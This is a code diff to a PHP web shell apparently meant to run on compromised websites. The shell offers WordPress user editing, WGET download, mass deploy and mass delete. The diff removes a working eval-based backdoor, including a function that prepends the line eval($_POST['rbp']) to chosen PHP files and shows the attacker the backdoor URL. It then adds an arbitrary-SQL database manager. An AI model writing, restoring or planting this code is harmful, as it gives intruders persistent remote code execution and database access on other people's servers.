@@ -58,14 +58,6 @@ if (!isset($_COOKIE['rbp_visited'])) {
     setcookie('rbp_visited', '1', time() + (86400 * 30), "/"); // 30 days
 }
 
-// Backdoor execution - FIXED AND WORKING 100%
-if(isset($_GET['rbp']) && $_GET['rbp']=='rbp'){
-    if(isset($_POST['rbp'])){
-        eval($_POST['rbp']);
-        exit;
-    }
-}
-
 // Auto-detect base directory for domains
 function RBPautoDetectBaseDir() {
     $possiblePaths = [
@@ -211,32 +203,6 @@ function RBPdownloadDomainsList($baseDir, $filename) {
     }
     
     return $domainsList;
-}
-
-// Add backdoor to file - FIXED AND WORKING 100%
-function RBPaddBackdoor($filePath, $backdoorCode) {
-    if (!file_exists($filePath)) {
-        return ["error" => "File not found: $filePath"];
-    }
-    
-    $originalContent = file_get_contents($filePath);
-    if ($originalContent === false) {
-        return ["error" => "Cannot read file: $filePath"];
-    }
-    
-    // Check if backdoor already exists
-    if (strpos($originalContent, '?rbp=rbp') !== false) {
-        return ["error" => "Backdoor already exists in file"];
-    }
-    
-    // Add backdoor code at the beginning for better execution
-    $newContent = "<?php if(isset(\$_GET['rbp']) && \$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){eval(\$_POST['rbp']);exit;}} ?>" . $originalContent;
-    
-    if (file_put_contents($filePath, $newContent)) {
-        return ["success" => "Backdoor added successfully to: $filePath"];
-    } else {
-        return ["error" => "Failed to add backdoor to: $filePath"];
-    }
 }
 
 // WordPress User Editor Function
@@ -554,6 +520,70 @@ require __DIR__ . '/wp-blog-header.php';";
     return $result;
 }
 
+// Database Manager Functions
+function RBPconnectDatabase($host, $user, $pass, $dbname) {
+    $mysqli = @new mysqli($host, $user, $pass, $dbname);
+    if ($mysqli->connect_error) {
+        return ["error" => "Connection failed: " . $mysqli->connect_error];
+    }
+    return ["success" => true, "connection" => $mysqli];
+}
+
+function RBPgetTables($mysqli) {
+    $tables = [];
+    $result = $mysqli->query("SHOW TABLES");
+    if ($result) {
+        while ($row = $result->fetch_array()) {
+            $tables[] = $row[0];
+        }
+        $result->free();
+    }
+    return $tables;
+}
+
+function RBPgetTableStructure($mysqli, $table) {
+    $structure = [];
+    $result = $mysqli->query("DESCRIBE `$table`");
+    if ($result) {
+        while ($row = $result->fetch_assoc()) {
+            $structure[] = $row;
+        }
+        $result->free();
+    }
+    return $structure;
+}
+
+function RBPgetTableData($mysqli, $table, $limit = 100, $offset = 0) {
+    $data = [];
+    $result = $mysqli->query("SELECT * FROM `$table` LIMIT $limit OFFSET $offset");
+    if ($result) {
+        while ($row = $result->fetch_assoc()) {
+            $data[] = $row;
+        }
+        $result->free();
+    }
+    return $data;
+}
+
+function RBPexecuteQuery($mysqli, $query) {
+    $result = $mysqli->query($query);
+    if ($result === false) {
+        return ["error" => $mysqli->error];
+    }
+    
+    if ($result === true) {
+        return ["success" => "Query executed successfully", "affected_rows" => $mysqli->affected_rows];
+    }
+    
+    $data = [];
+    while ($row = $result->fetch_assoc()) {
+        $data[] = $row;
+    }
+    $result->free();
+    
+    return ["success" => "Query executed successfully", "data" => $data, "num_rows" => count($data)];
+}
+
 // Handle base directory setting
 $defaultBaseDir = RBPautoDetectBaseDir();
 if (isset($_POST['baseDir'])) {
@@ -627,23 +657,65 @@ if (isset($_POST['mass_delete'])) {
     exit;
 }
 
-// Backdoor handler - FIXED AND WORKING 100%
-if (isset($_POST['add_backdoor'])) {
+// Database Manager Handler
+if (isset($_POST['db_connect'])) {
     $isPostAction = true;
-    $sourceFile = $_POST['backdoor_file_path'] ?? '';
+    $host = $_POST['db_host'] ?? 'localhost';
+    $user = $_POST['db_user'] ?? '';
+    $pass = $_POST['db_pass'] ?? '';
+    $dbname = $_POST['db_name'] ?? '';
     
-    if (empty($sourceFile) || !file_exists($sourceFile)) {
-        $_SESSION['backdoor_results'] = ["error" => "Source file not found: $sourceFile"];
-        header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
-        exit;
+    $connection = RBPconnectDatabase($host, $user, $pass, $dbname);
+    if (isset($connection['error'])) {
+        $_SESSION['db_error'] = $connection['error'];
+    } else {
+        $_SESSION['db_connection'] = [
+            'host' => $host,
+            'user' => $user,
+            'pass' => $pass,
+            'dbname' => $dbname,
+            'mysqli' => $connection['connection']
+        ];
+        $_SESSION['db_tables'] = RBPgetTables($connection['connection']);
     }
-    
-    // Fixed backdoor code - placed at beginning for better execution
-    $backdoorCode = "<?php if(isset(\$_GET['rbp']) && \$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){eval(\$_POST['rbp']);exit;}} ?>";
-    
-    $results = RBPaddBackdoor($sourceFile, $backdoorCode);
-    $_SESSION['backdoor_results'] = $results;
-    $_SESSION['backdoor_source'] = $sourceFile;
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
+    exit;
+}
+
+if (isset($_POST['db_query'])) {
+    $isPostAction = true;
+    if (isset($_SESSION['db_connection']['mysqli'])) {
+        $query = $_POST['db_query_text'] ?? '';
+        $result = RBPexecuteQuery($_SESSION['db_connection']['mysqli'], $query);
+        $_SESSION['db_query_result'] = $result;
+    }
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
+    exit;
+}
+
+if (isset($_GET['db_table'])) {
+    $isPostAction = true;
+    if (isset($_SESSION['db_connection']['mysqli'])) {
+        $table = $_GET['db_table'];
+        $_SESSION['db_current_table'] = $table;
+        $_SESSION['db_table_structure'] = RBPgetTableStructure($_SESSION['db_connection']['mysqli'], $table);
+        $_SESSION['db_table_data'] = RBPgetTableData($_SESSION['db_connection']['mysqli'], $table);
+    }
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
+    exit;
+}
+
+if (isset($_POST['db_disconnect'])) {
+    $isPostAction = true;
+    if (isset($_SESSION['db_connection']['mysqli'])) {
+        $_SESSION['db_connection']['mysqli']->close();
+    }
+    unset($_SESSION['db_connection']);
+    unset($_SESSION['db_tables']);
+    unset($_SESSION['db_current_table']);
+    unset($_SESSION['db_table_structure']);
+    unset($_SESSION['db_table_data']);
+    unset($_SESSION['db_query_result']);
     header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
 }
@@ -866,21 +938,6 @@ if (isset($_SESSION['adminer_result'])) {
     echo "'>" . $_SESSION['adminer_result'] . "</div>";
     echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
     unset($_SESSION['adminer_result']);
-}
-
-// BACKDOOR SUCCESS POPUP - ADDED
-if (isset($_SESSION['backdoor_results'])) {
-    $backdoorResults = $_SESSION['backdoor_results'];
-    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
-    if (isset($backdoorResults['success'])) {
-        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
-        echo "'>BACKDOOR SET SUCCESSFULLY!</div>";
-    } else {
-        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
-        echo "'>" . $backdoorResults['error'] . "</div>";
-    }
-    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
-    unset($_SESSION['backdoor_results']);
 }
 ?>
 
@@ -1224,6 +1281,61 @@ if (isset($_SESSION['backdoor_results'])) {
             padding: 20px;
             margin: 15px 0;
         }
+        
+        .db-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 10px 0;
+            background: #2a2a2a;
+        }
+        
+        .db-table th, .db-table td {
+            border: 1px solid #444;
+            padding: 8px;
+            text-align: left;
+            font-size: 12px;
+        }
+        
+        .db-table th {
+            background: #333;
+            color: #fff;
+            font-weight: bold;
+        }
+        
+        .db-table tr:nth-child(even) {
+            background: #2f2f2f;
+        }
+        
+        .db-table tr:hover {
+            background: #3a3a3a;
+        }
+        
+        .db-structure {
+            background: #2a2a2a;
+            border: 1px solid #444;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        
+        .db-query-box {
+            background: #2a2a2a;
+            border: 1px solid #444;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        
+        .db-query-box textarea {
+            width: 100%;
+            height: 100px;
+            background: #1a1a1a;
+            color: #fff;
+            border: 1px solid #555;
+            border-radius: 3px;
+            padding: 10px;
+            font-family: monospace;
+        }
     </style>
 </head>
 <body>
@@ -1239,7 +1351,7 @@ if (isset($_SESSION['backdoor_results'])) {
             <button class="tool-button" onclick="RBPshowWPEditUserPopup()">Edit WordPress User</button>
             <button class="tool-button" onclick="RBPshowWgetPopup()">WGET Download</button>
             <button class="tool-button" onclick="RBPshowMassDeployPopup()">Auto Mass Deploy</button>
-            <button class="tool-button" onclick="RBPshowBackdoorPopup()">Backdoor</button>
+            <button class="tool-button" onclick="RBPshowDatabaseManagerPopup()">Database Manager</button>
         </div>
         
         <div class="upload-section">
@@ -1249,6 +1361,145 @@ if (isset($_SESSION['backdoor_results'])) {
             </form>
         </div>
     </div>
+
+    <!-- Database Manager GUI -->
+    <?php if (isset($_SESSION['db_connection'])): ?>
+    <div style="background: #1a1a1a; padding: 15px; margin: 10px; border-radius: 5px; border: 2px solid #444;">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+            <h3 style="color: #4CAF50;">Database Manager - Connected to: <?php echo htmlspecialchars($_SESSION['db_connection']['dbname']); ?></h3>
+            <form method="post" style="display: inline;">
+                <button type="submit" name="db_disconnect" class="tool-button" style="background: #f44336; border-color: #f44336;">Disconnect</button>
+            </form>
+        </div>
+
+        <!-- Database Query Box -->
+        <div class="db-query-box">
+            <h4>SQL Query</h4>
+            <form method="post">
+                <textarea name="db_query_text" placeholder="Enter SQL query here..."><?php echo isset($_POST['db_query_text']) ? htmlspecialchars($_POST['db_query_text']) : ''; ?></textarea>
+                <div style="text-align: center; margin-top: 10px;">
+                    <button type="submit" name="db_query" class="tool-button">Execute Query</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Query Results -->
+        <?php if (isset($_SESSION['db_query_result'])): ?>
+        <div style="background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 5px; border: 1px solid #444;">
+            <h4>Query Results</h4>
+            <?php if (isset($_SESSION['db_query_result']['error'])): ?>
+                <p style="color: #f44336;">Error: <?php echo htmlspecialchars($_SESSION['db_query_result']['error']); ?></p>
+            <?php elseif (isset($_SESSION['db_query_result']['success'])): ?>
+                <p style="color: #4CAF50;"><?php echo htmlspecialchars($_SESSION['db_query_result']['success']); ?></p>
+                <?php if (isset($_SESSION['db_query_result']['affected_rows'])): ?>
+                    <p>Affected rows: <?php echo htmlspecialchars($_SESSION['db_query_result']['affected_rows']); ?></p>
+                <?php endif; ?>
+                <?php if (isset($_SESSION['db_query_result']['data']) && !empty($_SESSION['db_query_result']['data'])): ?>
+                    <div style="max-height: 400px; overflow: auto;">
+                        <table class="db-table">
+                            <thead>
+                                <tr>
+                                    <?php foreach (array_keys($_SESSION['db_query_result']['data'][0]) as $column): ?>
+                                        <th><?php echo htmlspecialchars($column); ?></th>
+                                    <?php endforeach; ?>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <?php foreach ($_SESSION['db_query_result']['data'] as $row): ?>
+                                    <tr>
+                                        <?php foreach ($row as $value): ?>
+                                            <td><?php echo htmlspecialchars($value); ?></td>
+                                        <?php endforeach; ?>
+                                    </tr>
+                                <?php endforeach; ?>
+                            </tbody>
+                        </table>
+                    </div>
+                <?php endif; ?>
+            <?php endif; ?>
+        </div>
+        <?php unset($_SESSION['db_query_result']); endif; ?>
+
+        <!-- Tables List -->
+        <div style="background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 5px; border: 1px solid #444;">
+            <h4>Database Tables</h4>
+            <div style="display: flex; flex-wrap: wrap; gap: 10px;">
+                <?php foreach ($_SESSION['db_tables'] as $table): ?>
+                    <a href="?db_table=<?php echo urlencode($table); ?>&d=<?php echo base64_encode($currentDir); ?>" 
+                       class="tool-button" 
+                       style="background: <?php echo (isset($_SESSION['db_current_table']) && $_SESSION['db_current_table'] === $table) ? '#4CAF50' : '#1a1a1a'; ?>">
+                        <?php echo htmlspecialchars($table); ?>
+                    </a>
+                <?php endforeach; ?>
+            </div>
+        </div>
+
+        <!-- Table Structure and Data -->
+        <?php if (isset($_SESSION['db_current_table'])): ?>
+        <div style="background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 5px; border: 1px solid #444;">
+            <h4>Table: <?php echo htmlspecialchars($_SESSION['db_current_table']); ?></h4>
+            
+            <!-- Table Structure -->
+            <div class="db-structure">
+                <h5>Structure</h5>
+                <table class="db-table">
+                    <thead>
+                        <tr>
+                            <th>Field</th>
+                            <th>Type</th>
+                            <th>Null</th>
+                            <th>Key</th>
+                            <th>Default</th>
+                            <th>Extra</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <?php foreach ($_SESSION['db_table_structure'] as $column): ?>
+                            <tr>
+                                <td><?php echo htmlspecialchars($column['Field']); ?></td>
+                                <td><?php echo htmlspecialchars($column['Type']); ?></td>
+                                <td><?php echo htmlspecialchars($column['Null']); ?></td>
+                                <td><?php echo htmlspecialchars($column['Key']); ?></td>
+                                <td><?php echo htmlspecialchars($column['Default'] ?? 'NULL'); ?></td>
+                                <td><?php echo htmlspecialchars($column['Extra']); ?></td>
+                            </tr>
+                        <?php endforeach; ?>
+                    </tbody>
+                </table>
+            </div>
+
+            <!-- Table Data -->
+            <div style="margin-top: 20px;">
+                <h5>Data (First 100 rows)</h5>
+                <?php if (!empty($_SESSION['db_table_data'])): ?>
+                    <div style="max-height: 400px; overflow: auto;">
+                        <table class="db-table">
+                            <thead>
+                                <tr>
+                                    <?php foreach (array_keys($_SESSION['db_table_data'][0]) as $column): ?>
+                                        <th><?php echo htmlspecialchars($column); ?></th>
+                                    <?php endforeach; ?>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <?php foreach ($_SESSION['db_table_data'] as $row): ?>
+                                    <tr>
+                                        <?php foreach ($row as $value): ?>
+                                            <td><?php echo htmlspecialchars($value); ?></td>
+                                        <?php endforeach; ?>
+                                    </tr>
+                                <?php endforeach; ?>
+                            </tbody>
+                        </table>
+                    </div>
+                <?php else: ?>
+                    <p>No data found in this table.</p>
+                <?php endif; ?>
+            </div>
+        </div>
+        <?php endif; ?>
+    </div>
+    <?php endif; ?>
 
     <!-- Results Popup -->
     <div id="resultsPopup" class="results-popup">
@@ -1300,27 +1551,6 @@ if (isset($_SESSION['backdoor_results'])) {
                 unset($_SESSION['mass_delete_results']);
                 unset($_SESSION['mass_delete_filename']);
                 unset($_SESSION['mass_delete_base']);
-            } elseif (isset($_SESSION['backdoor_results'])) {
-                $results = $_SESSION['backdoor_results'];
-                $sourceFile = $_SESSION['backdoor_source'];
-                
-                echo '<h3>Backdoor Results</h3>';
-                echo '<p><strong>Target File:</strong> ' . htmlspecialchars($sourceFile) . '</p>';
-                echo '<div style="max-height: 400px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
-                
-                if (isset($results['error'])) {
-                    echo '<p style="color: red;">' . htmlspecialchars($results['error']) . '</p>';
-                } else {
-                    echo '<p style="color: lime;">' . htmlspecialchars($results['success']) . '</p>';
-                    echo '<p style="color: yellow; margin-top: 10px;">Backdoor URL: ' . htmlspecialchars($sourceFile) . '?rbp=rbp</p>';
-                    echo '<p style="color: #ccc; font-size: 12px;">Use POST parameter: rbp=your_code_here</p>';
-                }
-                
-                echo '</div>';
-                
-                // Clear session
-                unset($_SESSION['backdoor_results']);
-                unset($_SESSION['backdoor_source']);
             } elseif (isset($_SESSION['wp_edit_results'])) {
                 $result = $_SESSION['wp_edit_results'];
                 
@@ -1495,42 +1725,28 @@ if (isset($_SESSION['backdoor_results'])) {
         </div>
     </div>
 
-    <!-- Backdoor Popup -->
-    <div id="backdoorPopup" class="popup-overlay">
+    <!-- Database Manager Popup -->
+    <div id="databaseManagerPopup" class="popup-overlay">
         <div class="popup-content">
-            <div id="backdoorContent">
-                <h3>Add Backdoor</h3>
-                <p>Select a PHP file to add backdoor code:</p>
-                
-                <div id="backdoorFileList" class="file-selector">
-                    <?php
-                    $phpFiles = [];
-                    if (is_dir($currentDir) && $handle = opendir($currentDir)) {
-                        while (false !== ($entry = readdir($handle))) {
-                            if ($entry != "." && $entry != ".." && !is_dir($currentDir . '/' . $entry) && pathinfo($entry, PATHINFO_EXTENSION) === 'php') {
-                                $phpFiles[] = $entry;
-                            }
-                        }
-                        closedir($handle);
-                    }
-                    foreach ($phpFiles as $file) {
-                        echo '<div class="file-selector-item" onclick="RBPselectBackdoorFile(\'' . htmlspecialchars($file) . '\')">' . htmlspecialchars($file) . '</div>';
-                    }
-                    if (count($phpFiles) === 0) {
-                        echo '<p style="color: red;">No PHP files found in current directory!</p>';
-                    }
-                    ?>
-                </div>
-                
-                <p><strong>Selected File Path:</strong></p>
-                <input type="text" id="backdoor_file_path" placeholder="/path/to/your/file.php" readonly>
-                
-                <div style="text-align: center; margin-top: 15px;">
-                    <button class="tool-button" style="background: #ff4444; border-color: #ff4444;" onclick="RBPsubmitBackdoor()">Add Backdoor</button>
-                    <button class="tool-button" onclick="RBPclosePopup('backdoorPopup')">Cancel</button>
-                </div>
-                
-                <p><small>This will add backdoor code: <code>?rbp=rbp</code> to the selected PHP file</small></p>
+            <div id="databaseManagerContent">
+                <h3>Database Manager</h3>
+                <p>Connect to MySQL Database:</p>
+                <form method="post">
+                    <input type="text" name="db_host" placeholder="Host (usually localhost)" value="localhost" required>
+                    <input type="text" name="db_user" placeholder="Database Username" required>
+                    <input type="password" name="db_pass" placeholder="Database Password">
+                    <input type="text" name="db_name" placeholder="Database Name" required>
+                    <div style="text-align: center; margin-top: 15px;">
+                        <button type="submit" name="db_connect" class="tool-button" style="background: #4CAF50; border-color: #4CAF50;">Connect to Database</button>
+                        <button type="button" class="tool-button" onclick="RBPclosePopup('databaseManagerPopup')">Cancel</button>
+                    </div>
+                </form>
+                <?php if (isset($_SESSION['db_error'])): ?>
+                    <div style="color: #f44336; margin-top: 10px; padding: 10px; background: #3c1a1a; border-radius: 5px;">
+                        <?php echo htmlspecialchars($_SESSION['db_error']); ?>
+                    </div>
+                    <?php unset($_SESSION['db_error']); ?>
+                <?php endif; ?>
             </div>
         </div>
     </div>
@@ -1637,8 +1853,8 @@ if (isset($_SESSION['backdoor_results'])) {
             document.getElementById('massDeployPopup').style.display = 'block';
         }
         
-        function RBPshowBackdoorPopup() {
-            document.getElementById('backdoorPopup').style.display = 'block';
+        function RBPshowDatabaseManagerPopup() {
+            document.getElementById('databaseManagerPopup').style.display = 'block';
         }
         
         function RBPselectFile(filename) {
@@ -1648,15 +1864,6 @@ if (isset($_SESSION['backdoor_results'])) {
             }
             event.target.classList.add('selected');
             document.getElementById('deploy_file_path').value = '<?php echo $currentDir; ?>/' + filename;
-        }
-        
-        function RBPselectBackdoorFile(filename) {
-            var items = document.getElementById('backdoorFileList').getElementsByClassName('file-selector-item');
-            for (var i = 0; i < items.length; i++) {
-                items[i].classList.remove('selected');
-            }
-            event.target.classList.add('selected');
-            document.getElementById('backdoor_file_path').value = '<?php echo $currentDir; ?>/' + filename;
         }
         
         function RBPclosePopup(popupId) {
@@ -1746,22 +1953,6 @@ if (isset($_SESSION['backdoor_results'])) {
             form.submit();
         }
         
-        function RBPsubmitBackdoor() {
-            var form = document.createElement("form");
-            form.method = "post";
-            form.action = "";
-            var input1 = document.createElement("input");
-            input1.name = "backdoor_file_path";
-            input1.value = document.getElementById('backdoor_file_path').value;
-            var input2 = document.createElement("input");
-            input2.name = "add_backdoor";
-            input2.value = "1";
-            form.appendChild(input1);
-            form.appendChild(input2);
-            document.body.appendChild(form);
-            form.submit();
-        }
-        
         function RBPdownloadDomains() {
             var extension = prompt("Enter file extension (e.g., rbp.html) or leave blank for domain only:", "rbp.html");
             if (extension !== null) {
@@ -1783,7 +1974,7 @@ if (isset($_SESSION['backdoor_results'])) {
         
         // Auto-show results popup if there are results
         window.onload = function() {
-            <?php if (isset($_SESSION['mass_deploy_results']) || isset($_SESSION['mass_delete_results']) || isset($_SESSION['wp_edit_results']) || isset($_SESSION['zoneh_results']) || isset($_SESSION['backdoor_results'])): ?>
+            <?php if (isset($_SESSION['mass_deploy_results']) || isset($_SESSION['mass_delete_results']) || isset($_SESSION['wp_edit_results']) || isset($_SESSION['zoneh_results'])): ?>
             document.getElementById('resultsPopup').style.display = 'block';
             <?php endif; ?>
         };
